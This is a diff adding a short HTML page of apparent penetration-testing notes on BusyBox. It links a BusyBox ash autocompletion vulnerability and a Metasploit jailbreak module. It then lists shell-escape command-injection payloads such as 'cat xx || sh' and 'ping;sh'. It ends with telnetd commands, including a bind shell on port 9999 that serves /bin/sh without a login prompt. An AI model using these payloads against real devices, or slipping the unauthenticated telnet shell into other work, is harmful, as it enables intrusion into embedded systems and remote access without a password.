@@ -1,0 +1,33 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Busybox</title>
+</head><body>Have not tried, but here is this busybox <a href="https://www.twistlock.com/2017/11/20/cve-2017-16544-busybox-autocompletion-vulnerability/">ash completion vulnerability</a>.<br/>
+<br/>
+<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/linux/busybox/jailbreak.rb">Metasploits attempts</a>&nbsp;for busybox escape:<br/>
+cat xx || sh<br/>
+ping || sh<br/>
+echo `sh &gt;&gt; /dev/ttyp0`<br/>
+ping `sh &gt;&gt; /dev/ttyp0`<br/>
+cat `sh &gt;&gt; /dev/ttyp0`<br/>
+cat xx;sh<br/>
+echo xx;sh<br/>
+ping;sh<br/>
+cat xx | sh<br/>
+ping | sh<br/>
+cat ($sh)<br/>
+cat xx &amp;&amp; sh<br/>
+echo xx &amp;&amp; sh<br/>
+ping &amp;&amp; sh<br/>
+<br/>
+The absolute easiest way to try to get access to a busybox install via command injection is telnetd. Busybox’s telnetd is different: on a normal telnetd install the “-l” flag enables line mode, but on busybox, -l specifies the command to use to challenge the user. That means if you specify the busybox shell, you get a shell without a user/pass prompt:<br/>
+<br/>
+telnetd -l/bin/sh<br/>
+<br/>
+Alternatively, The command below will bind a telnet shell to port 9999 without a path value and without running as root. Of course, now things get difficult.<br/>
+<br/>
+/bin/busybox telnetd -l/bin/sh -p9999 <br/>
+<br/>
+<br/>
+</body></html>
